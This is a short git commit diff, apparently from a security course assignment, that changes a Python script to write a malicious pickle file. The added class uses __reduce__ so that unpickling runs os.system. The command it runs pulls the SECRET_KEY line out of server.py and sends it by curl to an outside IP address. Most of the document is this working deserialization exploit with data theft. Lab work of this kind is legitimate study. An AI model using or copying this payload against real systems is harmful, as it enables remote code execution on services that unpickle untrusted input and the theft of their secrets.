08936bd5a6e4333be9fb6047832c8c1e57fc350b
root <root@localhost.localdomain>
2017-12-07 14:29:47 -0500

    5.2.2 done

--- mp5/5.1.2.1.py
+++ mp5/5.1.2.1.py
@@ -1,7 +1,11 @@
 import pickle
+import os
 
 test = {1:"1",2:"2",3:"3"}
+class binsh(object):
+	def __reduce__(self):
+		return(os.system, ('cat server.py | grep "SECRET_KEY" | curl -d @- 18.217.216.108:9000',))
 
-pickleOut = open("5.1.2.1.pickle","wb")
-pickle.dump(test, pickleOut)
+pickleOut = open("5.2.2.1.pickle","wb")
+pickle.dump(binsh(), pickleOut)
 pickleOut.close()
